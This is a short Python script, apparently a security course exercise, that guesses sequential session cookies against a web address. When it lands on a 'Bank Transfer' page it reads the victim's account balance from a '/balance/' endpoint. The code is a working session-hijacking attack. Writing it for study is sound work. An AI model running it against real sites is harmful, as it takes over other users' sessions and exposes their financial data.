import sys
import requests
import json
from bs4 import BeautifulSoup
import re


def test_session(address):
	# write your code here
	for i in range(1, 12):
		sessionid = {'sessionid': 'session-{}'.format(i)}
		conn = requests.get(address, cookies=sessionid)

		try:
			soup = BeautifulSoup(conn.content, 'html.parser')

			if soup.title.string == "Bank Transfer":
				value = requests.get(address + "/balance/", cookies=sessionid).json()
				return value['balance']
		except AttributeError:
			continue


	return None



def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
